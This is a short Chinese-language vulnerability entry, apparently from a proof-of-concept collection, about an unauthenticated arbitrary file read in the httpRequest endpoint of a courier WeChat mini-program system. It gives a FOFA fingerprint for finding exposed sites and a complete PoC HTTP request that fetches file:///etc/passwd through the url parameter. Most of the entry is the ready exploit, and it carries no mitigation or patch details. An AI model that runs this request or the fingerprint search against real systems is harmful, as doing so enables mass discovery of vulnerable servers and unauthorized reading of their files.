# 快递微信小程序系统httpRequest任意文件读取漏洞

快递微信小程序系统 httpRequest 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统文件。

## fofa

```javascript
body="static/default/newwap/lang/js/jquery.localize.min.js"
```

## poc

```javascript
GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
```

![image-20241101192644761](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011926836.png)